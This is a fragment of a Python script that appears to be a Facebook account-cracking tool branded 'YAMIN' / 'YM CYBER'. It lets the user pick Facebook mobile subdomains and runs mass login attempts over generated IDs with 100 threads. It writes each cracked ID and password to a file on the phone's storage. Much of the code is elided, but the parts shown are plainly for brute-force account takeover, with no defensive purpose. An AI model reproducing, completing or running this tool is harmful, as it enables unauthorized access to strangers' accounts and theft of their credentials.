...
\033[34;1m✮⃝ YAMIN𝄟⃝\x1b[38;5;196m {𝟭}\033[38;5;46m\x1b[38;5;196m╔══➻〱𝗡𝗔𝗠𝗘\033[33;1m➽   \033[38;5;46mYAMIN
\033[34;1m✮⃝ YAMI𝗡𝄟⃝\x1b[38;5;196m {𝟮}\033[38;5;46m\x1b[38;5;196m╚══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \x1b[38;5;196m
\033[34;1m✮⃝ YAMI𝗡𝄟⃝\x1b[38;5;196m {𝟯}\033[38;5;46m\033[38;5;46m╔══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \033[34;1m
\033[34;1m✮⃝ YAMI𝗡𝄟⃝\x1b[38;5;196m {𝟰}\033[38;5;46m\033[38;5;46m╚══➻〱𝗥𝗔𝗡𝗗𝗢𝗠\033[33;1m➽ \033[33;1m𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟬𝟱
\033[34;1m✮⃝ YAMI𝗡𝄟⃝\x1b[38;5;196m {𝟱}\033[38;5;46m\033[33;1m╔══➻〱𝗧𝗢𝗢𝗟𝗦\033[33;1m➽  \033[33;1mYM 𝗖𝗬𝗕𝗘𝗥
\033[34;1m✮⃝ YAMI𝗡𝄟⃝\x1b[38;5;196m {𝟲}\033[38;5;46m\033[33;1m╚══➻〱𝗙𝗥𝗢𝗠\033[33;1m➽  \x1b[38;5;196m 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛"""
...
def sykology():
    ...
    for z in range(ehc_lim):
        ...
        emran.append(co)
    print(" \033[38;5;46m════════════════════════════════════")
    print(" \033[38;5;46mYAMIN𝟭➲〱{𝗘𝗛𝗖}╔══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗠.}")
    print(" \033[38;5;46mYAMIN𝟮➲〱{𝗘𝗛𝗖}╚══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗠-𝗕𝗔𝗦𝗜𝗖}")
    print(" \033[38;5;46mYAMIN𝟯➲〱{𝗘𝗛𝗖}╔══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗙𝗥𝗘𝗘.}")
    print(" \033[38;5;46mYAMIN𝟰➲〱{𝗘𝗛𝗖}╚══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗣.}")
    print(" \033[38;5;46mYAMIN𝟱➲〱{𝗘𝗛𝗖}╔══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗫.}")
    print(" \033[38;5;46mYAMIN𝟲➲〱{𝗘𝗛𝗖}╚══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎𝗙𝗨𝗖𝗞{𝗬𝗢𝗨}")
    print(" \033[38;5;46m════════════════════════════════════")
    line()
    ...
    if gxd in ["YAMIN1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["YAMIN2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["YAMIN3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["YAMIN4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["YAMIN5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        tl=str(len(emran))
        print(" \033[38;5;46m════════════════════════════════════")
        print(f"\033[38;5;46m𝗙𝗕 𝗜𝗗 𝗦𝗔𝗩𝗘: /\033[38;5;47msdcard/\033[38;5;49mYAMIN-𝗢𝗞.𝘁𝘅𝘁") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[YAMIN✅] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
...
""")
                open("/sdcard/YAMIN -ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
